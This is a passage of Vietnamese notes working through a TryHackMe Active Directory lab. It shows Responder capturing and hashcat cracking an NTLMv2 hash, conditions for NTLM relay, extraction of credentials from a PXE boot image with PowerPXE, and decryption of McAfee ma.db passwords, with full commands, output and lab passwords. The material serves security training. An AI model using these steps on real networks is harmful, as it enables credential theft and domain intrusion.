  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [breachad]
    Responder IP               [10.150.70.17]
    Responder IPv6             [fe80::9e12:b7d2:a4b8:4491]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-OXW3GI5RZR2]
    Responder Domain Name      [2LNQ.LOCAL]
    Responder DCE-RPC Port     [45242]

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...                                                                                                                                                  

[!] Error starting TCP server on port 389, check permissions or other servers running.
[SMB] NTLMv2-SSP Client   : 10.200.70.202
[SMB] NTLMv2-SSP Username : ZA\svcFileCopy
[SMB] NTLMv2-SSP Hash     : svcFileCopy::ZA:974f36921946e29f:1173818B35CC81435FC9D79CB6633F18:010100000000000080320179F0FEDC01A9CBFA41E15F7FF3000000000200080032004C004E00510001001E00570049004E002D004F0058005700330047004900350052005A005200320004003400570049004E002D004F0058005700330047004900350052005A00520032002E0032004C004E0051002E004C004F00430041004C000300140032004C004E0051002E004C004F00430041004C000500140032004C004E0051002E004C004F00430041004C000700080080320179F0FEDC010600040002000000080030003000000000000000000000000020000004DD8B59814669FDFD557F9D687471735228BF4B57A15C098FFF94C8CCD85D9F0A001000000000000000000000000000000000000900220063006900660073002F00310030002E003100350030002E00370030002E00310037000000000000000000                   
```

Nếu dùng thiết bị giả mạo thật, ta có thể chạy Responder trong thời gian dài để thu thập nhiều response. Khi đã có một vài response, ta có thể thực hiện **crack offline** để cố gắng khôi phục mật khẩu NTLM tương ứng. Nếu tài khoản dùng mật khẩu yếu, khả năng crack thành công sẽ cao hơn.

Sao chép **NTLMv2-SSP Hash** vào một file text. Sau đó dùng danh sách mật khẩu được cung cấp trong task và **Hashcat** để thử crack hash bằng lệnh:

```
hashcat -m 5600 <hash file> <password file> --force
```

Ta dùng hashtype **5600**, tương ứng với **NTLMv2-SSP** trong Hashcat. Nếu dùng máy riêng, bạn cần cài Hashcat trước.

Bất kỳ hash nào crack được sẽ cung cấp cho ta credential AD để tiếp tục quá trình xâm nhập.

```bash
(base) ┌──(kali㉿kali)-[~/Responder]
└─$ hashcat -m 5600 hf pw.txt --force                                                                                         
hashcat (v7.1.2) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12450HX, 2336/4673 MB (1024 MB allocatable), 7MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (2848 MB free)

Dictionary cache built:
* Filename..: pw.txt
* Passwords.: 513
* Bytes.....: 4010
* Keyspace..: 513
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Hashcat is expecting at least 7168 base words but only got 7.2% of that.
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

SVCFILECOPY::ZA:974f36921946e29f:1173818b35cc81435fc9d79cb6633f18:010100000000000080320179f0fedc01a9cbfa41e15f7ff3000000000200080032004c004e00510001001e00570049004e002d004f0058005700330047004900350052005a005200320004003400570049004e002d004f0058005700330047004900350052005a00520032002e0032004c004e0051002e004c004f00430041004c000300140032004c004e0051002e004c004f00430041004c000500140032004c004e0051002e004c004f00430041004c000700080080320179f0fedc010600040002000000080030003000000000000000000000000020000004dd8b59814669fdfd557f9d687471735228bf4b57a15c098fff94c8ccd85d9f0a001000000000000000000000000000000000000900220063006900660073002f00310030002e003100350030002e00370030002e00310037000000000000000000:FPassword1!
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SVCFILECOPY::ZA:974f36921946e29f:1173818b35cc81435f...000000
Time.Started.....: Thu Jun 18 07:15:06 2026, (0 secs)
Time.Estimated...: Thu Jun 18 07:15:06 2026, (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (pw.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:    18895 H/s (0.60ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 513/513 (100.00%)
Rejected.........: 0/513 (0.00%)
Restore.Point....: 0/513 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> hockey
Hardware.Mon.#01.: Util: 16%

Started: Thu Jun 18 07:14:25 2026

```

### Relaying the Challenge

Trong một số trường hợp, chúng ta có thể tiến thêm một bước bằng cách **relay challenge** thay vì chỉ thu thập nó trực tiếp. Việc này khó hơn nếu chưa biết trước thông tin tài khoản, vì cuộc tấn công phụ thuộc vào quyền của tài khoản liên quan. Cần một vài điều kiện thuận lợi:

* **SMB Signing** nên bị tắt, hoặc được bật nhưng không bắt buộc. Khi relay, chúng ta chỉnh sửa nhẹ request để chuyển tiếp nó. Nếu SMB signing bị bắt buộc, ta không thể giả mạo chữ ký thông điệp, nên server sẽ từ chối.
* Tài khoản liên quan cần có quyền phù hợp trên server để truy cập tài nguyên được yêu cầu. Lý tưởng nhất là relay challenge và response của tài khoản có quyền admin trên server, vì điều này giúp ta có foothold trên host.
* Vì chưa có foothold trong AD, ta phải đoán tài khoản nào có quyền trên host nào. Nếu đã xâm nhập AD trước đó, ta có thể enumeration ban đầu để xác định thông tin này.

Đây là lý do **blind relay** thường không phổ biến. Lý tưởng nhất là xâm nhập AD bằng cách khác trước, sau đó enumeration để xác định quyền của tài khoản đã chiếm được. Từ đó, có thể thực hiện **lateral movement** để leo thang đặc quyền trong domain. Tuy nhiên, vẫn nên hiểu cơ bản cách relay attack hoạt động, như sơ đồ bên dưới:

<figure><img src="../../.gitbook/assets/image (881).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (882).png" alt=""><figcaption></figcaption></figure>



Microsoft Deployment Toolkit\



Các tổ chức lớn cần các công cụ để triển khai và quản lý hạ tầng trong toàn bộ hệ thống. Với những tổ chức quy mô lớn, không thể để nhân viên IT dùng DVD hay USB chạy quanh để cài phần mềm trên từng máy một.

May mắn là Microsoft đã cung cấp sẵn các công cụ cần thiết để quản lý hệ thống này. Tuy nhiên, nếu các công cụ đó bị cấu hình sai, chúng ta có thể khai thác chúng để xâm nhập AD.

### MDT and SCCM&#xD;

**Microsoft Deployment Toolkit (MDT)** là một dịch vụ của Microsoft hỗ trợ tự động hóa việc triển khai hệ điều hành Microsoft. Các tổ chức lớn dùng những dịch vụ như MDT để triển khai image mới trong hệ thống hiệu quả hơn, vì các image gốc có thể được quản lý và cập nhật tập trung.

Thông thường, MDT được tích hợp với **System Center Configuration Manager (SCCM)** của Microsoft, công cụ quản lý các bản cập nhật cho ứng dụng, dịch vụ và hệ điều hành Microsoft. MDT được dùng cho các triển khai mới. Về cơ bản, nó cho phép đội IT cấu hình sẵn và quản lý các boot image. Vì vậy, khi cần cấu hình một máy mới, họ chỉ cần cắm cáp mạng và mọi thứ sẽ tự động diễn ra.

Họ có thể chỉnh sửa boot image theo nhiều cách, chẳng hạn cài sẵn phần mềm mặc định như **Office 365** và phần mềm diệt virus mà tổ chức sử dụng. Nó cũng có thể đảm bảo bản cài đặt mới được cập nhật ngay trong lần chạy đầu tiên.

**SCCM** có thể được xem như phần mở rộng, hoặc “người anh lớn” của MDT. Sau khi phần mềm được cài đặt thì chuyện gì xảy ra? SCCM đảm nhiệm phần **quản lý bản vá** này. Nó cho phép đội IT xem các bản cập nhật có sẵn cho toàn bộ phần mềm được cài trong hệ thống.

Đội IT cũng có thể kiểm thử các bản vá này trong môi trường sandbox để đảm bảo chúng ổn định trước khi triển khai tập trung đến tất cả các máy đã joined domain. Điều này giúp công việc của đội IT dễ dàng hơn rất nhiều.

Tuy nhiên, bất kỳ công cụ nào cung cấp khả năng quản lý hạ tầng tập trung như MDT và SCCM cũng có thể trở thành mục tiêu của attacker, nhằm chiếm quyền kiểm soát các phần quan trọng trong hệ thống. Mặc dù MDT có thể được cấu hình theo nhiều cách khác nhau, trong phần này chúng ta sẽ chỉ tập trung vào một cấu hình gọi là **Preboot Execution Environment (PXE) boot**.

### PXE Boot&#xD; &#xD;

Các tổ chức lớn dùng **PXE boot** để cho phép thiết bị mới khi kết nối vào mạng có thể tải và cài đặt hệ điều hành trực tiếp qua kết nối mạng.

**MDT** có thể được dùng để tạo, quản lý và host các **PXE boot image**. PXE boot thường được tích hợp với **DHCP**, nghĩa là nếu DHCP cấp phát IP cho máy, máy đó sẽ được phép yêu cầu PXE boot image và bắt đầu quá trình cài đặt hệ điều hành qua mạng.

<figure><img src="../../.gitbook/assets/image (883).png" alt=""><figcaption></figcaption></figure>

Sau khi quá trình này diễn ra, client sẽ dùng kết nối **TFTP** để tải **PXE boot image**. Ta có thể khai thác PXE boot image cho hai mục đích khác nhau:

* Chèn một hướng leo thang đặc quyền, chẳng hạn như tài khoản **Local Administrator**, để có quyền admin vào OS sau khi PXE boot hoàn tất.
* Thực hiện tấn công **password scraping** để khôi phục thông tin đăng nhập AD được dùng trong quá trình cài đặt.

Trong phần này, chúng ta sẽ tập trung vào mục thứ hai. Ta sẽ cố gắng khôi phục tài khoản dịch vụ triển khai liên quan đến **MDT service** trong quá trình cài đặt thông qua tấn công password scraping. Ngoài ra, cũng có khả năng lấy được các tài khoản AD khác được dùng cho quá trình cài đặt tự động các ứng dụng và dịch vụ.

### PXE Boot Image Retrieval&#xD; &#xD;

Vì **DHCP** hơi khó xử lý, chúng ta sẽ bỏ qua các bước ban đầu của cuộc tấn công này. Cụ thể, ta sẽ bỏ qua phần yêu cầu IP và thông tin cấu hình sẵn PXE boot từ DHCP. Thay vào đó, ta sẽ thực hiện thủ công phần còn lại của cuộc tấn công từ bước này.

Thông tin đầu tiên về cấu hình PXE boot mà bạn thường nhận được qua DHCP là **IP của MDT server**. Trong trường hợp này, bạn có thể lấy thông tin đó từ sơ đồ mạng của TryHackMe.

Thông tin thứ hai thường nhận được là tên của các file **BCD**. Các file này lưu thông tin liên quan đến PXE boot cho từng loại kiến trúc hệ thống khác nhau.

Để lấy thông tin này, bạn cần truy cập website:

`http://pxeboot.za.tryhackme.com`

Trang này sẽ liệt kê nhiều file **BCD** khác nhau:



<figure><img src="../../.gitbook/assets/image (884).png" alt=""><figcaption></figcaption></figure>

Thông thường, bạn sẽ dùng **TFTP** để yêu cầu từng file **BCD** này và liệt kê cấu hình của tất cả chúng. Tuy nhiên, để tiết kiệm thời gian, ta sẽ tập trung vào file BCD của kiến trúc **x64**.

Hãy sao chép và lưu lại tên đầy đủ của file này. Trong phần còn lại của bài thực hành, ta sẽ dùng placeholder:

`x64{7B...B3}.bcd`

Vì các file và tên của chúng được **MDT tạo lại mỗi ngày**. Mỗi khi thấy placeholder này, hãy nhớ thay nó bằng tên file BCD cụ thể của bạn. Ngoài ra, nếu network vừa mới khởi động, các tên file này chỉ cập nhật sau khoảng **10 phút** kể từ khi network hoạt động.

Sau khi đã “khôi phục” được thông tin ban đầu này từ DHCP, ta có thể liệt kê và tải **PXE Boot image**. Trong vài bước tiếp theo, ta sẽ dùng kết nối **SSH** trên **THMJMP1**, vì vậy hãy đăng nhập vào phiên SSH bằng lệnh sau:

```
ssh thm@THMJMP1.za.tryhackme.com
```

Với mật khẩu:

```
Password1@
```

Để đảm bảo tất cả người dùng trong network đều có thể dùng SSH, hãy bắt đầu bằng cách tạo một thư mục với username của bạn và copy repo **powerpxe** vào thư mục đó:

```powershell
C:\Users\THM>cd Documents
C:\Users\THM\Documents> mkdir <username>
C:\Users\THM\Documents> copy C:\powerpxe <username>\
C:\Users\THM\Documents\> cd <username>
```

```powershell
thm@THMJMP1 C:\Users\thm\Documents>mkdir  Am0 

thm@THMJMP1 C:\Users\thm\Documents>copy C:\powerpxe Am0\
C:\powerpxe\LICENSE      
C:\powerpxe\PowerPXE.ps1 
C:\powerpxe\README.md    
        3 file(s) copied.           
                                    
thm@THMJMP1 C:\Users\thm\Documents>cd  Am0 

thm@THMJMP1 C:\Users\thm\Documents\Am0> 
```

Bước đầu tiên là dùng **TFTP** để tải file **BCD** về, nhằm đọc cấu hình của MDT server. TFTP hơi khó hơn FTP vì ta không thể liệt kê file. Thay vào đó, ta gửi yêu cầu file và server sẽ kết nối lại qua **UDP** để truyền file. Vì vậy, cần nhập chính xác tên file và đường dẫn.

Các file BCD luôn nằm trong thư mục `/Tmp/` trên MDT server. Ta có thể bắt đầu truyền file bằng lệnh sau trong phiên SSH:

```
C:\Users\THM\Documents\Am0> tftp -i <THMMDT IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd
Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s
```

Bạn cần tra IP của **THMMDT** bằng:

```
nslookup thmmdt.za.tryhackme.com
```

Sau khi đã lấy được file BCD, ta sẽ dùng **powerpxe** để đọc nội dung của nó. PowerPXE là một script PowerShell có thể tự động thực hiện kiểu tấn công này, nhưng kết quả thường không ổn định, nên làm thủ công sẽ tốt hơn.

Ta sẽ dùng hàm `Get-WimFile` của powerpxe để lấy vị trí của **PXE Boot image** từ file BCD:

```
C:\Users\THM\Documents\Am0> powershell -executionpolicy bypass
```



```powershell
PS C:\Users\THM\Documents\am0> Import-Module .\PowerPXE.ps1
PS C:\Users\THM\Documents\am0> $BCDFile = "conf.bcd"
PS C:\Users\THM\Documents\am0> Get-WimFile -bcdFile $BCDFile
>> Parse the BCD file: conf.bcd
>>>> Identify wim file : <PXE Boot Image Location>
<PXE Boot Image Location>
```

File **WIM** là image có thể boot được, thuộc định dạng **Windows Imaging Format**. Khi đã có vị trí của PXE Boot image, ta tiếp tục dùng TFTP để tải image này:

```
PS C:\Users\THM\Documents\am0> tftp -i <THMMDT IP> GET "<PXE Boot Image Location>" pxeboot.wim
Transfer successful: 341899611 bytes in 218 second(s), 1568346 bytes/s
```

Quá trình tải sẽ mất một lúc vì đây là một Windows image đầy đủ, có thể boot và đã được cấu hình sẵn. Bạn có thể đứng dậy vận động nhẹ hoặc uống nước trong lúc chờ.

### Recovering Credentials from a PXE Boot Image

Sau khi đã lấy được **PXE Boot image**, ta có thể trích xuất các credential được lưu bên trong. Có nhiều kiểu tấn công khác nhau có thể thực hiện, ví dụ:

* Chèn thêm user **Local Administrator** để có quyền admin ngay khi image boot.
* Cài image để có một máy đã joined domain.
* Trích xuất credential được lưu trong image.

Bài này sẽ tập trung vào cách đơn giản: cố gắng trích xuất credential.

Một lần nữa, ta sẽ dùng **powerpxe** để lấy credential. Bạn cũng có thể làm thủ công bằng cách giải nén image và tìm file `bootstrap.ini`, nơi các credential kiểu này thường được lưu.

Để dùng powerpxe lấy credential từ file bootstrap, chạy lệnh sau:

```powershell
PS C:\Users\THM\Documents\am0> Get-FindCredentials -WimFile pxeboot.wim
>> Open pxeboot.wim
>>>> Finding Bootstrap.ini
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$
>>>> >>>> UserID = <account>
>>>> >>>> UserDomain = ZA
>>>> >>>> UserPassword = <password>
```

Như bạn thấy, **powerpxe** đã khôi phục được credential AD. Bây giờ ta có thêm một bộ credential AD khác có thể sử dụng.



giải&#x20;

<figure><img src="../../.gitbook/assets/image (885).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (886).png" alt=""><figcaption></figcaption></figure>



## Configuration Files

{% file src="../../.gitbook/assets/mcafee-sitelist-pwd-decryption-1649686607913.zip" %}

Cách cuối cùng mà chúng ta sẽ khám phá để **enumeration** trong mạng này là thông qua **các file cấu hình (configuration files)**.

Giả sử bạn may mắn khai thác thành công một lỗ hổng và có quyền truy cập vào một máy trong mạng của tổ chức. Khi đó, các file cấu hình là một nguồn thông tin rất đáng giá để tìm kiếm credential của Active Directory.

Tùy thuộc vào loại máy đã bị xâm nhập, những file cấu hình sau có thể hữu ích cho quá trình enumeration:

* File cấu hình của ứng dụng web (**Web Application Config Files**)
* File cấu hình dịch vụ (**Service Configuration Files**)
* Các khóa Registry (**Registry Keys**)
* Các ứng dụng được triển khai tập trung (**Centrally Deployed Applications**)

Nhiều công cụ enumeration, chẳng hạn như [**Seatbelt**](https://github.com/GhostPack/Seatbelt?utm_source=chatgpt.com), có thể được sử dụng để tự động hóa quá trình thu thập và phân tích các thông tin này.

### Configuration File Credentials&#xD; &#xD;

Tuy nhiên, trong phần này chúng ta sẽ tập trung vào việc **khôi phục credential từ một ứng dụng được triển khai tập trung**.

Thông thường, các ứng dụng này cần một cơ chế xác thực với domain trong cả hai giai đoạn:

* Khi cài đặt (installation phase)
* Khi hoạt động (execution phase)

Một ví dụ là **McAfee Enterprise Endpoint Security**, giải pháp EDR (Endpoint Detection and Response) mà nhiều tổ chức sử dụng để giám sát và bảo vệ các máy trạm.

McAfee lưu trữ credential được sử dụng trong quá trình cài đặt để kết nối trở lại máy chủ quản lý (orchestrator) trong một file có tên là **`ma.db`**.

Nếu có quyền truy cập cục bộ (local access) trên máy, chúng ta có thể lấy và đọc file cơ sở dữ liệu này để khôi phục tài khoản dịch vụ AD liên quan.

Trong bài thực hành này, chúng ta sẽ tiếp tục sử dụng quyền truy cập SSH trên **THMJMP1**.

File **`ma.db`** được lưu tại một vị trí cố định:

```bash
thm@THMJMP1 C:\Users\THM>cd C:\ProgramData\McAfee\Agent\DB
thm@THMJMP1 C:\ProgramData\McAfee\Agent\DB>dir
 Volume in drive C is Windows 10
 Volume Serial Number is 6A0F-AA0F

 Directory of C:\ProgramData\McAfee\Agent\DB      

03/05/2022  10:03 AM    <DIR>          .
03/05/2022  10:03 AM    <DIR>          ..
03/05/2022  10:03 AM           120,832 ma.db      
               1 File(s)        120,832 bytes     
               2 Dir(s)  39,426,285,568 bytes free
```

We can use SCP to copy the ma.db to our AttackBox:

```bash
(base) ┌──(kali㉿kali)-[~/Responder]
└─$ scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
thm@thmjmp1.za.tryhackme.com's password: 
ma.db                                                                                                                                      100%  118KB  74.4KB/s   00:01 
```

Using sqlitebrowser, we will select the Browse Data option and focus on the AGENT\_REPOSITORIES table:

```bash
sqlitebrowser ma.db
```

<div align="center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/aeda85be24462cc6a3f0c03cd899053a.png" alt=""></div>

Chúng ta đặc biệt quan tâm đến **bản ghi thứ hai**, tập trung vào các trường:

* **DOMAIN**
* **AUTH\_USER**
* **AUTH\_PASSWD**

Hãy ghi lại các giá trị được lưu trong những trường này. Tuy nhiên, trường **AUTH\_PASSWD** đang được mã hóa.

May mắn là McAfee mã hóa trường này bằng một khóa đã được công khai. Vì vậy, chúng ta có thể sử dụng một script Python cũ để giải mã mật khẩu. S



Tuy nhiên, gần đây công cụ đã được cập nhật để hỗ trợ **Python 3**. Phiên bản mới nhất có thể tải tại:

[mcafee-sitelist-pwd-decryption GitHub](https://github.com/funoverip/mcafee-sitelist-pwd-decryption?utm_source=chatgpt.com)

Trước tiên, bạn cần giải nén file:

```
mcafee-sitelist-pwd-decryption.zip
```

#### Ý chính

McAfee lưu credential của **service account AD** trong file `ma.db`:

<figure><img src="../../.gitbook/assets/image (891).png" alt=""><figcaption></figcaption></figure>

| Trường       | Ý nghĩa            |
| ------------ | ------------------ |
| DOMAIN       | Domain AD          |
| AUTH\_USER   | Tài khoản dịch vụ  |
| AUTH\_PASSWD | Mật khẩu đã mã hóa |

Mặc dù mật khẩu được mã hóa, cơ chế mã hóa của McAfee đã được nghiên cứu công khai. Vì vậy, nếu lấy được file `ma.db`, attacker thường có thể khôi phục lại mật khẩu của service account và sử dụng nó để tiếp tục enumeration hoặc mở rộng quyền truy cập trong domain.



By providing the script with our base64 encoded and encrypted password, the script will provide the decrypted password:

```bash
(base) ┌──(kali㉿kali)-[~/mcafee-sitelist-pwd-decryption]
└─$ python3 mcafee_sitelist_pwd_decrypt.py  jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
Crypted password   : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
Decrypted password : MyStrongPassword!
```

We now once again have a set of AD credentials that we can use for further enumeration! This is just one example of recovering credentials from configuration files. If you are ever able to gain a foothold on a host, make sure to follow a detailed and refined methodology to ensure that you recover all loot from the host, including credentials and other sensitive information that can be stored in configuration files.

<figure><img src="../../.gitbook/assets/image (892).png" alt=""><figcaption></figcaption></figure>
